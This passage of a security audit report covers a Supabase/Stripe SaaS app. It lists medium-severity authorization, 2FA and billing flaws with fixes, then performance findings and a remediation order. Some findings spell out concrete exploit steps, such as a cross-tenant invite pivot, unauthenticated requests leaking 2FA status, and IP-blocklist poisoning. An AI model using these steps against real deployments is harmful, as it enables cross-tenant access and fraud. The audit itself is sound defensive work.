**M3. Unauthenticated LLM/scraper proxies drain the shared credit pool.** **[merged: edge-authz #11 + injection-xss #36]** `doc-ai/index.ts:3-6` is literally `"Access-Control-Allow-Origin": "*"`, reads `{ text, action }` at `:12`, and spends `LOVABLE_API_KEY` at `:34` with no auth read, no origin check, no length cap and no quota; the 402 handler at `:58-62` returns "AI credits exhausted", confirming a shared pool. `calendar-ai/index.ts:15` is the identical shape. `seo-scrape/index.ts:15` proxies an arbitrary URL through `FIRECRAWL_API_KEY` — not in config.toml, but the public anon key satisfies the gate, so it is effectively open (and is SSRF-by-proxy). When the ceiling is hit, **every** paying tenant loses quooro-chat, doc-ai and calendar-ai simultaneously. **Fix:** remove the `verify_jwt = false` entries for `doc-ai` and `calendar-ai`; add in-handler `auth.getUser()` 401s to all three; replace the wildcard headers with `getCorsHeaders(req)`; cap `text.length` (8–10k); add a per-user rolling-window quota table. Restrict `seo-scrape` targets to verified hosts. Separately, `marketing-copy-rewrite/index.ts:1` imports `'npm:@supabase/supabase-js@2/cors'`, which is not a real subpath export — that function almost certainly fails to boot. Fix or delete it.

**M4. Unconditional 30-day trial.** `create-subscriptions-checkout/index.ts:67` always passes `subscription_data: { trial_period_days: 30 }`; nothing queries prior subscriptions or customer metadata — the only validation is that `priceId` ∈ `VALID_PRICE_IDS` (`:10-19`, `:46-48`). Subscribe → 30 days free → cancel before the first invoice → repeat, on any of the six SKUs including Enterprise. Related hygiene: `check-subscriptions-plan/index.ts:50-57` and `check-designer-subscription/index.ts:43-50` both contain `const grantedEmails = ["muzzylord@gmail.com", "echelon@gmail.com"];` returning `{ subscribed: true }` before any Stripe call. **Fix:** list the customer's subscriptions with `status: 'all'` and pass `subscription_data: {}` when any prior subscription has a non-null `trial_end` — better, configure the trial on the Stripe Price so this client-facing function cannot influence it. Move `grantedEmails` into a `comp_accounts` table keyed on `user_id`.

**M5. `acc_accountant_invites` UPDATE has `WITH CHECK (true)` — org_id pivot into another tenant's ledger.** `20260714001231_a734910e…sql:43-52`: USING restricts to admin-or-org-owner, then the policy ends `WITH CHECK (true)`, so the row can be moved to a different `org_id`. `token` is a plain client-supplied TEXT column with no default (`:6`), and `acc-accept-invite/index.ts:41-49` validates only status, expiry and that `invite.email` matches the caller, then upserts `acc_org_members` with the service role (`:51-58`). Create your own org → create an invite to your own email → `PATCH` its `org_id` to the victim → accept. Requires a victim org UUID, which no RLS-readable path exposes (the world-readable token-lookup policy was dropped by `20260714024522…:25-26`), so it needs an out-of-band leak. **Fix:** mirror the USING clause into WITH CHECK; `ALTER COLUMN token SET DEFAULT encode(gen_random_bytes(32),'hex')`; add a BEFORE UPDATE trigger rejecting changes to `org_id`, `token` and `email` — the last is what actually defeats the accept-invite email check.

**M6. `store-checkout` — unauthenticated cross-tenant order insert.** `supabase/functions/store-checkout/index.ts:40-42`, `:78` — `body.user_id` is the merchant identity, taken straight from the request; service-role client at `:37`; `verify_jwt = false` (config.toml:63-64). Items are priced from the `products` table without checking the product belongs to `body.user_id`. `POST /store-checkout/confirm` with a known session id flips status to `confirmed`; the GET at `:99-111` returns the full order row plus signed product-image URLs to any caller holding the (unguessable) session id. No payment bypass — `:126` sets `awaiting_payment`/`unpaid` and no payment is processed in this file. **Fix:** resolve the merchant server-side from the storefront slug the shopper visited; reject `items[].id` not belonging to that merchant; require the merchant's JWT for `confirm` (or drive it from a signature-verified Stripe webhook); return only the fields the success page renders.

**M7. `acc_report_trial_balance` and siblings — SECURITY DEFINER financial reports, default PUBLIC execute.** `20260714001231_a734910e…sql:79` — `LANGUAGE sql STABLE SECURITY DEFINER`, filtering solely on `WHERE coa.org_id = _org`, never comparing `_org` to the caller. Not in the `20260714024522` REVOKE list. Same shape on `acc_ensure_fx_accounts(uuid)`, `acc_get_fx_rate(uuid,text,text,date)` and `acc_post_fx_revaluation(uuid,date,uuid)` in `20260713235746_28b7e580…` — the last one **writes journal entries**. **Fix:** `REVOKE EXECUTE … FROM PUBLIC, anon; GRANT … TO authenticated;` and rewrite in plpgsql opening with `IF NOT (has_role(auth.uid(),'admin') OR acc_is_org_member(auth.uid(), _org)) THEN RAISE EXCEPTION 'forbidden' USING ERRCODE = '42501'; END IF;`.

**M8. `booking_settings` exposes every merchant's `stripe_account_id` and `user_id` to anon.** `20260308000823_a9236729…sql:157` — `CREATE POLICY "Public can view booking settings" … FOR SELECT USING (booking_page_enabled = true);` with no `TO` clause, and `booking_page_enabled BOOLEAN DEFAULT true` (`:108`) means essentially every row qualifies. `GET /rest/v1/booking_settings?select=*` is a complete merchant roster correlated to auth user ids — and those ids are the input C1 keys on. **Fix:** drop the policy; create `booking_settings_public` as a view exposing only `business_name, business_slug, timezone, branding_color, branding_logo, confirmation_message, allow_cancellation, cancellation_hours, booking_notice_hours, max_advance_days`, granted to `anon, authenticated`.

**M9. `crm_run_workflow` / `crm_execute_workflow_actions` — SECURITY DEFINER writes with no caller check.** `20260714135559_9ce3c7d7…sql:258` (RPC, `GRANT … TO authenticated` at `:265-266`) and `:69` (executor, grant at `:206-207`); neither compares the caller to `_workflow_id` or `_entity_id`. The definer-only privilege is real: `notifications` INSERT is `WITH CHECK (public.is_owner(user_id))` (`20260215185849_6baaa2d7…:5-7`), yet `:175` of the executor inserts a notification for an arbitrary owner uuid — so an attacker forges a "Security alert / click here to re-verify" notification into any victim's feed. Also forges `client_onboarding` (`:107`) and `app_projects` (`:151`) rows. **Fix:** gate on `has_role(auth.uid(),'admin') OR EXISTS (SELECT 1 FROM crm_workflows w WHERE w.id = _workflow_id AND w.created_by = auth.uid())`. The trigger path `crm_dispatch_lifecycle_workflows` (`:208`) `PERFORM`s the executor, so keep the gate in the RPC wrapper and revoke EXECUTE on the executor from `authenticated`. **Only effective once C3 is fixed** — otherwise `created_by` is the sole remaining boundary.

**M10. `rbac_user_roles` writable via `WITH CHECK (assigned_by = auth.uid())`.** `20260302215113_7bdb5816…sql:82-93`, `FOR ALL TO authenticated`, with `assigned_by` an ordinary client-supplied column. An attacker can attach arbitrary roles to *other named users*, corrupting `AdminRoleManagement` and `rbac_audit_log`. It does **not** yield admin: `has_rbac_permission()` is referenced by no policy and no edge function, and `useRBAC`'s `hasPermission` is used only by the role-management UI itself. Real authorization is `has_role(auth.uid(),'admin')` over `user_roles`, which this chain cannot write. **Fix:** replace with `USING/WITH CHECK (has_role(auth.uid(),'admin') OR role_id IN (SELECT id FROM public.rbac_roles WHERE created_by = auth.uid()))`, and add `AND is_system = false` to the `rbac_roles` INSERT check. Apply **together with H5**, since `is_team_owner(auth.uid())` is an equally self-granted disjunct on the same policies.

**M11. Client-supplied `ip` defeats the new-device gate and poisons the blocklist.** **[merged: edge-authz #5 + frontend-authz #27 + secrets-crypto #44]** `two-factor-auth/index.ts:424` destructures `ip: clientProvidedIP` from the body and `:427` is `const clientIP = clientProvidedIP || clientIPFromHeaders;` — the body wins, and `src/hooks/useIPCheck.ts:24-34` fetches the address from `api.ipify.org` and posts it on all five actions, so the header path is dead in production. `add-known-ip` (`:494-519`) writes it into `profiles.known_ips` with the service-role client **and no code check**; `check-ip` (`:462-489`) then returns `requiresVerification: false`, which is exactly what `UnifiedSignIn.tsx:332` and `Login.tsx:176` branch on. `checkAndAutoBlockIP` (`:285-332`) counts on the same spoofable value, so rotating it evades the 5-failure auto-block — and conversely, sending a *victim's* address five times inserts it into `blocked_ips` for an hour, returning 403 to everyone behind that NAT at the pre-auth check (`:351-362`). **Fix:** delete `ip` from the contract in both files; `const clientIP = clientIPFromHeaders;` and delete the now-dead comparison at `:429-442`. Require a valid TOTP before `add-known-ip` mutates `known_ips`. Return a masked list or count from `get-known-ips` (`:521-539`). Note this only silences the UI prompt — the load-bearing fix is H7.

**M12. 2FA rate limit is a non-atomic read-then-write.** `two-factor-auth/index.ts:444-452` SELECTs `two_factor_attempts` rows from the last 30s, then `if (recentAttempts.length >= 3)`; the failure INSERT doesn't land until `:610-616`/`:780-786`. Edge functions serve concurrently across isolates, so N parallel requests all pass the SELECT before any INSERT. `TOTP.verify` defaults to `window = 1` (`:92`) → 3 valid codes per instant of 10^6. Nothing invalidates an accepted code, so a shoulder-surfed or phishing-relayed code is replayable across `verify`, `verify-ip`, `verify-setup` and `disable` for the full ±90s. Subsumed by H7 in practice, but it is the only guard on the code space. **Fix:** a SECURITY DEFINER `consume_2fa_attempt(p_user_id uuid)` doing `INSERT … ON CONFLICT DO UPDATE SET n = n + 1 RETURNING n` in one statement, with exponential lockout past ~5 cumulative failures; plus a `two_factor_used_codes(user_id, time_step)` table with a unique constraint.

**M13. Paid-feature paywall is a pure render gate.** `src/components/lounge/SubscriptionPaywall.tsx:193` is `if (subscribed) return <>{children}</>;`, `subscribed` is set only at `:155` inside a `try/catch {}` that silently swallows failures (`:156-157`), and admins are hard-bypassed at `:137-141`. No migration references any subscription or entitlement function: `inv_products` has exactly one policy, `FOR ALL USING (auth.uid() = user_id)` (`20260219215504_e2519703:58`), and `automation_schedules`/`api_keys` are ownership-only via `is_owner(user_id)` (`20260302200052:120-123`, `:142-145`). Any signed-in customer runs `supabase.from('inv_products').insert({user_id: me, …})` and has Inventory Management (£49.99/mo) for free; same for Advanced Automations (£69.99/mo). Revenue leakage, not a data breach. **Fix:** `public.has_active_subscription(_user_id uuid, _product_id text)` reading the Stripe-synced subscriptions table, AND-ed into the RLS of every gated table; re-check entitlement in the automation worker at execution time so schedules stop firing when a subscription lapses. Keep `SubscriptionPaywall` as UX only.

**M14. Third-party secrets stored plaintext and re-served to the browser.** `src/components/lounge/ConnectionsSettings.tsx:455` (`credentials: fields,`) writes raw form state into `user_connections.credentials`; the Stripe provider collects `{ key: 'secret_key', placeholder: 'sk_live_...' }` at `:254` plus `webhook_secret` at `:255`; `:407` reads it back with `.select('provider, credentials, …')` and `:417` pushes it into form state, so the live key is in the DOM on every page load. No encryption trigger exists on that table — `20260125232404` attaches `encrypt_*` triggers to six tables, never `user_connections`, despite the comment at `20260216135654:2` claiming otherwise. The banner at `:794` says "All credentials are encrypted at rest". RLS is owner-only, so there is no cross-tenant path — but this converts the C6 XSS into a merchant Stripe-account takeover. **Fix:** write credentials through an edge function that encrypts server-side; change `:407` to `.select('provider, is_connected, connected_at')` plus a stored `key_prefix`/`last4` hint; render placeholders instead of pre-filling. Until then, correct the copy at `:794` and the stale comment in the migration.

**M15. `two-factor-auth` `status` action leaks 2FA enrolment for any user id.** `two-factor-auth/index.ts:375-391` — the `if (!authHeader …)` branch queries `profiles` with the service-role client (built at `:343-346`) and `verify_jwt = false`, so `{"action":"status","userId":"<uuid>"}` needs no credential and returns `{"twoFactorEnabled":false}`. Target triage for credential spraying. **Fix:** delete the branch — by the time 2FA matters the client already holds a session, and the authenticated `status` case later in the switch covers it.

**M16. `comm_presence` is fully readable by every authenticated user.** `20260215201626_46118548…sql:211-212` — `FOR SELECT TO authenticated USING (true);`, while the sibling read-receipts policy in the same block (`:204-208`) is properly scoped by channel membership. Yields one row per platform user: uuid, status, custom status text, `last_seen_at`. A user-enumeration primitive and a working-hours leak. **Fix:** scope to `user_id = auth.uid() OR` a channel co-membership `EXISTS`, wrapping the test in the existing `public.is_channel_member` helper to avoid recursion.

**M17. `site-visitor-auth` `verify` action is broken and sessions cannot be revoked.** `:21` consumes the body with `await req.json()` and `:117`, inside the reachable `verify` branch, calls `await req.json()` again — a Deno request body reads once, so it throws into the catch at `:145-151` and returns 500 on every call. `src/contexts/StorefrontContext.tsx:61-66` only acts on `data?.visitor`, so it fails closed today — but `site_visitor_sessions` rows accumulate unread, and there is no server-side revocation at all (`logout` at `StorefrontContext.tsx:142-145` only clears localStorage), so once the double-read is fixed a copied 7-day token becomes live. **Fix:** read the body once into a variable; add a `logout` action that deletes the session row; add scheduled cleanup past `expires_at`.

**M18. Client account passwords minted with `Math.random()`.** `src/components/admin/LeadDetailDialog.tsx:342` — `const tempPassword = Math.random().toString(36).slice(-10) + 'A1!';` passed to `create-client`, which calls `createUser({ email, password, email_confirm: true })` (`create-client/index.ts:106-111`). The handler never displays, emails or expires it, so a live email-confirmed account carries a ~50-bit non-CSPRNG credential indefinitely. (Also at `AdminAdManagement.tsx:323`, `AdminContentRequests.tsx:146`.) **Fix:** use `crypto.getRandomValues` — the codebase already does it correctly at `OfficePasswordVault.tsx:83`. Better: create the user unconfirmed and send a Supabase invite/recovery link. Force a reset on every account already created through `handleConvertToClient`.

---

## Performance

Ordered by measured saving. Items 1–3 are the whole story; the rest are cleanup.

**P1. 115,572 B gzip (443,403 B raw) — Globe3D pulls the entire recharts vendor chunk for one Babel helper.** `dist/assets/Globe3D-BuPWy5wN.js` contains exactly `import{_ as We}from"./vendor-charts-DHKbq9nx.js"` and nothing else from that chunk; the single binding is `@babel/runtime`'s `_extends`, consumed by `@react-three/drei`. `vite.config.ts:48` gives explicit chunk homes to clsx/tailwind-merge/tslib/etc. but has no `@babel/runtime` rule, so Rollup parks it in whichever vendor chunk claims it first. No chart renders on the landing page. Deferred behind `DeferredGlobe3D`'s IntersectionObserver, so only visitors who scroll pay — but they pay 115 KB gzip for a 466 B helper. **Fix** — extend the existing helper rule at `vite.config.ts:38-40`:
```ts
if (id.includes("commonjsHelpers") || id.includes("commonjs-dynamic-modules") || id.includes("node_modules/@babel/runtime/"))
  return "vendor-cjs-helpers";
```
`vendor-cjs-helpers` is currently 466 B raw / 309 B gzip and already modulepreloaded. Verify: `grep -o 'vendor-charts' dist/assets/Globe3D-*.js` must return nothing.

**P2. 117,417 B minified / ~32.9 KB gzip — 24.6% of the entry chunk is a markdown parser nobody reaches on the landing page.** `src/components/ChatBot.tsx:10` is a static `import ReactMarkdown from "react-markdown";`, and the eager chain is `src/App.tsx:25` (`import Index` — the one non-lazy route) → `src/pages/Index.tsx:31` → `src/components/layout/Layout.tsx:5` → `<ChatBot />` rendered unconditionally at `:32`. Sourcemap byte-attribution over the entry chunk: micromark-core-commonmark 27,583 / property-information 18,293 / mdast-util-to-hast 10,895 / mdast-util-from-markdown 10,367 / micromark 9,575 / hast-util-to-jsx-runtime 5,943 / vfile 5,183 / unified 4,158 / micromark-util-subtokenize 3,581 / react-markdown 2,760 / @ungap/structured-clone 2,744 — of a 477,307 B entry chunk (133,644 B gzip). None of it can execute until a visitor opens the chat bubble, types, and gets a reply. **Fix:** `const ReactMarkdown = lazy(() => import("react-markdown"));` and wrap the render regions at `:367/:437/:447` in a per-message-body `<Suspense fallback={<span className="whitespace-pre-wrap">{content}</span>}>` — not around the whole ChatBot, or the panel blanks on first open. Verify: `grep -l atxHeading dist/assets/index-*.js` returns nothing.

**P3. ~222,940 B wasted on every mobile landing-page visit — 14 hero screenshots downloaded, 6 rendered.** `src/components/marketing/FloatingScreenshotHero.tsx:59-68` — `useIsMobile()` seeds `useState(false)`, so React's **first commit** is always the 14-card desktop tree (`desktopPlacements`, 14 entries at `:29`; `mobilePlacements`, 6 at `:47`; selected at `:153`). React 18 schedules initial passive effects in a separate MessageChannel task after the commit, and the browser takes a rendering opportunity in between — which is exactly when Chrome evaluates `loading="lazy"` intersection and starts all 14 fetches. All 14 files total 349,924 B; the first six are 126,984 B. There is also a visible 14→6 layout pop. **Fix:**
```ts
const [isMobile, setIsMobile] = useState(
  () => typeof window !== "undefined" && window.matchMedia("(max-width: 639px)").matches
);
```
and switch the listener at `:61-66` from `resize` to `matchMedia(...).addEventListener("change", …)`, matching the 640px `sm:` breakpoint used in the card markup.

**P4. ~100 KB more on mobile — hero images have no `srcset`.** All 14 sources are 640×429 (VP8 headers read directly). `:154-155` set `cardW = isMobile ? 130 : 240`, and mobile placement scales are 0.38–0.42, so a mobile card image is ~55 CSS px wide ≈ 165 device px at DPR3 — roughly 4× linear over-delivery. `:301-310` is a bare `<img src>` with no `srcset`/`sizes`. **Do not downsample the 640w source for desktop**: `:264` applies `scale(${isHovered ? 1.18 : card.s})`, so a hovered desktop card needs ~566 device px at DPR2. **Fix:** generate 256w siblings at build time (vite-imagetools or a sharp prebuild) and add `srcSet={`${s.webp256} 256w, ${s.webp640} 640w`} sizes="(max-width: 639px) 60px, 290px"`.

**P5. 45,444 B gzip (318,347 B raw) of render-blocking CSS on every route.** `src/main.tsx:24` imports `./index.css`; Vite emits one stylesheet, linked in `<head>` of `dist/index.html`. Note the "86% unused" figure from Chrome coverage is not an actionable target — every `:hover`, `dark:` and unmatched-media rule in a Tailwind build scores "unused" while still being required. **Fix, two available steps:** (1) move the genuinely route-scoped hand-written blocks — `src/index.css:1097-1258` ("Workshop UI") and `:1259-1408` ("Lounge UI Preference Overrides"), ~310 lines — into CSS files imported by their own lazy route modules, so Vite emits per-chunk stylesheets. (2) For the Tailwind utility layer, which cannot be route-split, inline an above-the-fold critical subset and load the main sheet with `media="print" onload="this.media='all'"` via a `transformIndexHtml` plugin reading the emitted asset map. Size the critical subset to include `:hover`/`dark:` variants of the selectors it reports, or the page flickers on first interaction.

**P6. ~131 KB of fonts undiscoverable until the entry chunk executes.** `index.html` has no `<link rel="preload" as="font">` anywhere (head runs from `:15` straight to the OG tags). All 18 `@font-face` rules in the built CSS carry `font-display: swap` and **none carries `unicode-range`**, so the browser has no coverage hint and cannot start a fetch until a glyph is laid out — which in an SPA with an empty `<div id="root">` cannot happen until the 133,644 B gzip entry chunk has downloaded, parsed and committed. Visible swap flash on the H1 on every cold load. **Fix:** a `transformIndexHtml` plugin that reads the emitted asset map and injects preloads for exactly two families (filenames are content-hashed, so they cannot be hard-coded):
```html
<link rel="preload" as="font" type="font/woff2" crossorigin href="/assets/sora-latin-600-normal-<hash>.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="/assets/work-sans-latin-400-normal-<hash>.woff2" />
```
Preloading all 18 would contend with the entry chunk.

**P7. 443,520 B of deploy weight — 18 legacy `.woff` files that are never requested.** `dist/assets` contains 18 `.woff2` (361,512 B) and 18 `.woff` (443,520 B); every `@font-face` lists woff2 first, and `vite.config.ts:22` is `target: "esnext"`, so any browser that can run the bundle has supported woff2 for a decade. Zero per-visitor cost — pure build/CDN weight. **Fix:** a post-`generateBundle` Vite plugin deleting `.woff` assets **and** stripping `,url(…) format("woff")` from the emitted CSS — the CSS rewrite is the load-bearing half, or 18 rules point at 404s.

**P8. 23,664 B — Inter is downloaded on the landing page only to fail at rendering flag emoji.** `tailwind.config.ts:18` is `body: ["'Work Sans'", "Inter", "system-ui", "sans-serif"]`; all four Work Sans weights load, so Inter can never win normal text selection. `src/components/Globe3D.tsx:11-16` renders regional-indicator flag strings through drei's `<Html>` at `:231-245`; Work Sans has no such glyphs and, because no `@font-face` declares a `unicode-range`, the browser cannot rule Inter out without fetching it. **Do not remove `@fontsource/inter`** — it is a real primary face at `src/components/slides/types.ts:62-83`, `ScaledSlide.tsx:312`, and three admin/CRM views. **Fix:** drop Inter from the body stack and terminate it with emoji families (`"'Apple Color Emoji'","'Segoe UI Emoji'","'Noto Color Emoji'"`), and move the four `@fontsource/inter/latin-*.css` imports out of `src/main.tsx:17-20` into the modules that need them, removing 4 `@font-face` rules from the render-blocking sheet.

**P9. 35,314 B favicon.** `index.html:15` points at `public/favicon.png`, which the IHDR shows is 500×500 / 35,314 B — larger than 13 of the 14 hero screenshots. Fetched at Lowest priority and cached, so per-visit cost is small, but the fix is one line: re-encode to 48×48 (~1.2 KB) and add `sizes="48x48"`. Also drop one of the two shipped icons — `dist/` carries both `favicon.ico` (20,373 B) and `favicon.png` and only the PNG is referenced.

**P10. 23,172 B logo PNG on first paint.** `src/components/layout/Navbar.tsx:10` imports `quooro-logo.png` (359×83, 23,172 B), rendered at `h-6 sm:h-7`. The **dimensions are correct** for DPR3 (121 CSS px wide → 363 device px); the waste is purely the PNG encoding — the same artwork is ~6 KB as WebP. The `dark:brightness-0 dark:invert` filter at `:916` applies identically.

**P11. 92,290 B `code-transform.webp` served at 1920×1080 to 390px phones.** `src/pages/Index.tsx:723` passes it to `ParallaxImage`, which renders a bare `<img>` at `src/components/ParallaxImage.tsx:111-115` (and a `motion.img` at `:168-169`) with no `srcSet`/`sizes` passthrough. Far below the fold and already `loading="lazy"`, so scroll-time only. Fix needs 640/1280/1920 variants **and** new props wired through both render paths.

**P12. Runtime — admin and CRM screens that download whole tables.** In descending order of user-visible cost:
- `src/components/admin/AdminMessaging.tsx:145-148` — `.from('messages').select('*')` with no filter or limit, plus `conversations.select('*')`, joined in JS. The realtime effect (`:97-135`) has an **unfiltered** INSERT listener ending in `refreshConversations()` (`:119`) and an unfiltered UPDATE listener whose entire body is `refreshConversations()` (`:125-128`). `markMessagesAsRead` (`:234-245`) calls it directly **and** emits K WAL UPDATE events, each triggering another full download — 50 unread ⇒ 51 back-to-back full table fetches. Fix: server-side aggregate RPC for the conversation list; scope the INSERT listener with `filter: 'recipient_id=eq.' + user.id`; delete the blanket UPDATE listener; debounce any remaining refresh 500 ms.
- `src/pages/lounge/LoungeCRM.tsx:180-187` — `.limit(10000)` with **no virtualization** (`grep useVirtualizer|react-window` in this file: nothing). The filter `useMemo` at `:211-230` copies the array, runs five `toLowerCase().includes()` per row and sorts the whole result **on every keystroke** (`searchQuery` has no debounce), then re-reconciles an unwindowed `filtered.map` building ~7-10 DOM nodes per row (`:826` mobile, `:901` desktop). Multi-second input latency at a few thousand leads. Fix: `useVirtualizer` — already used in `src/pages/lounge/crm/CRMShell.tsx` — plus server-side filter/sort with `.range()`; interim, debounce 250 ms and cap the rendered slice.
- `src/pages/lounge/crm/useCRMData.ts:67-81` — serial `.select('*')` paging (`pageSize` 1000, `while (from < 50000)`) across three CRM tables on mount **and after every mutation** (`CRMShell.tsx:105-115` ends `assignTo()` with `refresh()`). Fix: server-side windows with `count: 'exact'` feeding the virtualizer; patch local state from the ids just updated instead of refetching.
- `src/components/admin/AdminClientAccounts.tsx:134-158` — `1 + 2T + M` queries (unbounded `client_teams`, then per-team memberships + primary profile, then one `profiles…single()` **per member**). T=200/M=1000 ⇒ 1,401 requests in one burst. Same pattern at `src/pages/lounge/LoungeTeam.tsx:177-186`. Fix: `client_teams.select('*, team_memberships(*)').range(…)` + one `profiles.select(…).in('user_id', allUserIds)`.
- `src/pages/Dashboard.tsx:315-344` — unbounded `enquiries.select('*')` and `profiles.select('*')`, both piped through `decryptPiiFields`, which at `src/lib/piiDecrypt.ts:31-36` fires **one `decrypt_pii` POST per unique encrypted value** concurrently. A module-level Map caches after first load. The same file's siblings already paginate at 50 (`AdminEnquiries.tsx:94-99`). Fix: `.range()` + explicit column lists + a `decrypt_pii_batch(text[])` set-returning RPC.
- `src/components/admin/AdminLeadManagement.tsx:168-191` — six leading-wildcard ILIKEs plus `count: 'exact'` **per keystroke** (input at `:776-781`, no debounce), and twice per keystroke while `currentPage != 1` because of the reset effect at `:204`; each fetch also drags `decryptPiiFields` over `['phone','email']` (`:186`). Fix: separate `debouncedSearch` state (300 ms) in the `useCallback` deps, reset the page in the same setter, `count: 'planned'`, and a `pg_trgm` GIN index. Same shape at `AdminEnquiries.tsx:85`.
- `src/components/layout/Navbar.tsx:781-792` — `useTransform(scrollY, [0,100],[80,64])` piped through `useMotionValueEvent` into `setCurrentNavHeight`, re-rendering a 1040-line unmemoized component once per scroll frame; the four `FullWidthMegaMenu` panels at `:1017-1028` sit in a `useMemo` **keyed on `currentNavHeight`**, so all four re-render too, while `style={{ height: navHeight }}` on the fixed nav (`:899`) forces layout in the same frames. The only consumer is `const scrolled = currentNavHeight < 80` (`:892`). Fix: store the boolean, pass constant heights to the panels, toggle a CSS class instead of animating `height`.
- `src/components/admin/AdminCommandCenter.tsx:86-90` — `client_invoices/crm_deals/app_projects/profiles` all `select('*')` (including `profiles.enquiry_data` JSON blobs) purely to compute `reduce`d totals at `:110-121`. The `leads` query on the same lines already uses a narrow column list. Fix: one metrics RPC, or `select('id', { count:'exact', head:true })`.
- `src/pages/lounge/LoungeAssetStorage.tsx:199-203` — unbounded `client_assets.select('*')`, filtered client-side at `:514-521`, rendered unwindowed at `:924`/`:1040`, with `SecureImage` → `useSignedUrl` issuing **one `createSignedUrl` POST per image** (`src/hooks/useSignedUrl.ts:33-35`). 400 images ⇒ 400 requests. Fix: `.eq('folder_id',…).range(…)`, push filters into the query, and one `createSignedUrls(paths, 3600)` per page.
- `src/pages/lounge/OfficeWordHome.tsx:127-146` — `for (const id of ids) { await supabase…delete().eq('id', id); }` for both batch delete and batch star, with `selectAll` (`:122-125`) making the loop length unbounded. 300 docs ≈ 24 s at 80 ms RTT. Same at `src/pages/lounge/accounting/PayrollView.tsx:370-376` and `src/pages/lounge/inventory/InventoryStockCount.tsx:142`. Fix: `.in('id', ids)`.
- `src/hooks/useCommMessages.ts:105-107` — an **unfiltered** `comm_reactions` listener (the sibling `comm_messages` listener at `:101-104` correctly carries `filter: 'channel_id=eq.'`), so any reaction in any channel you belong to triggers a full non-incremental refetch (200 messages + profiles + a reactions `.in()`). Fix: patch the local reaction map from `payload.new`/`payload.old`; handle new messages incrementally too.
- `src/pages/lounge/LoungeBilling.tsx:351-369` — three `check-subscriptions-plan` invocations per mount (one per plan), each a Deno cold start plus a Stripe round-trip, bypassing the app's configured `staleTime: 5*60*1000` (`src/App.tsx:198`). Fix: accept `{ productIds: string[] }`, return a map, wrap in `useQuery`.
- `src/components/comms/PollCard.tsx:75-90` — two queries and a dedicated websocket channel per poll rendered. Bounded in practice (polls are rare in the last 200 messages). Fix: hoist vote loading into `enrichMessages` with one `.in('poll_id', pollIds)`.
- Landing-page micro-costs (all low): `HeroParticleField.tsx:61-66` and `FloatingScreenshotHero.tsx:167-176` each call `getBoundingClientRect()` inside a window `mousemove` (browsers coalesce to ~1/frame, so this is 2-3 forced reflows per frame, not per hardware sample); `CustomCursor.tsx:16-22` writes `style.transform` directly with `mixBlendMode: 'difference'`, on by default (`useUIPreferences.ts:103`) and mounted outside the router (`App.tsx:437`) — though touch devices are correctly excluded at `GlobalCursorProvider.tsx:32-42`; and neither rAF loop (`FloatingScreenshotHero.tsx:178-186`, `HeroParticleField.tsx:71-113`) pauses when the hero scrolls out of view, despite the correct IntersectionObserver pattern existing at `src/components/DeferredGlobe3D.tsx:31-41`.

**P13. 131,879,226 B (125.8 MB, 3,157 files) of build artifacts in git HEAD.** `dist-audit`, `dist-audit2`, `dist-map`, `dist-map2` are tracked. `.gitignore:11` is `dist` — which does not match `dist-audit`, which is why `dist-ssr` needed its own line at `:12`. They are already deleted in the working tree; only the deletion needs committing. **Fix:** `git add -A && git commit`, then widen `.gitignore:11` to `dist` + `dist-*/`. Blobs remain in history; a `filter-repo` rewrite is only worth it if clone size matters.

---

## Fix order

### Phase 0 — do today, before writing any code

1. **[dashboard] Rotate `SUPABASE_SERVICE_ROLE_KEY`, `STRIPE_SECRET_KEY`, `RESEND_API_KEY`, `LOVABLE_API_KEY`, `FIRECRAWL_API_KEY`.** C2 means any user who ever signed up could have read all of them. Do this **first** — every later fix is worthless if the service-role key is already out. *Owner judgement: rotating the service-role key requires redeploying all 43 edge functions; rotating the Stripe key requires updating any webhook/dashboard integration. Schedule a short window.*
2. **[code] Delete the `code` node case at `supabase/functions/execute-workflow/index.ts:76-84`** (or replace with the shadowed-globals stopgap). Deploy before step 1's rotation completes, or the new keys leak the same way. *Safe to automate — but check whether any customer workflow currently uses a `code` node; if so, they break, which is the intended outcome.*
3. **[dashboard] Check Supabase logs** for `rpc/get_security_logs_decrypted`, `rpc/decrypt_pii`, `ecommerce_orders` bulk `Range` reads and anonymous `quooro-chat` POSTs, to establish whether any of this has already been exploited. *Owner judgement: if it has, breach-notification obligations follow.*

### Phase 1 — critical, this week

4. **[code] Rewrite `quooro-chat` auth (C1)** and **[code] remove `[functions.quooro-chat] verify_jwt = false` from `supabase/config.toml`.** *Owner judgement — this is the one fix that definitely breaks a working flow: the public marketing chatbot on the landing page currently runs through this function unauthenticated. Split it into two functions (public marketing chat with no service-role client and no CRUD tools; authenticated lounge chat) before flipping the flag, or the landing page chat 401s.*
5. **[code] New migration: drop the `ecommerce_orders` anon SELECT policy and revoke the anon SELECT grant (C4).** *Safe to automate — but confirm the storefront success page doesn't read the order directly with the anon key first; if it does, ship the `lookup_token` variant in the same migration.*
6. **[code] New migration: revoke + guard `get_security_logs_decrypted`, `get_blocked_ips_decrypted`, `get_whitelisted_ips_decrypted` (C5), and revoke `encrypt_pii`/`decrypt_pii` from PUBLIC/anon/authenticated (H6).** *Safe to automate for the three `_decrypted` functions. The `decrypt_pii` revoke **will** break `src/lib/piiDecrypt.ts` and therefore the Dashboard, AdminEnquiries and AdminLeadManagement PII columns — ship the replacement service-role edge function in the same change, or accept masked values for a day.*
7. **[code] New migration: CRM constant-org stopgap (C3)** — `USING (public.has_role(auth.uid(),'admin'))` on all nine `crm_*` tables. *Safe to automate. This locks non-admin users out of the CRM UI, which is the correct posture until real membership exists. Do the `crm_is_org_member` build-out in Phase 2.*
8. **[code] Sanitize `LoungeMail` (C6)** — add DOMPurify, wrap in a sandboxed iframe, sanitize at ingestion in `email-sync/index.ts:210` and `:350`, and backfill stored rows. *Safe to automate; expect some legitimate marketing emails to render slightly differently, which is acceptable.*

### Phase 2 — high, next

9. **[code] `booking-api`: mandatory key for mutating actions + `.eq('user_id', …)` scoping + stop echoing full rows (H1).** *Owner judgement — any integrator currently calling cancel/reschedule without a key breaks. Check the `api_keys` table for active integrations and notify them.*
10. **[code] `deploy-site`: ownership check on `siteId`, scoped `site_domains` upsert (H2).** *Safe to automate.*
11. **[code] New migration: drop both `site-files` write policies (H3).** *Safe to automate — `deploy-site` uses the service role and is unaffected; the admin console is covered by the surviving admin policy. Do **not** add the folder-name predicate.*
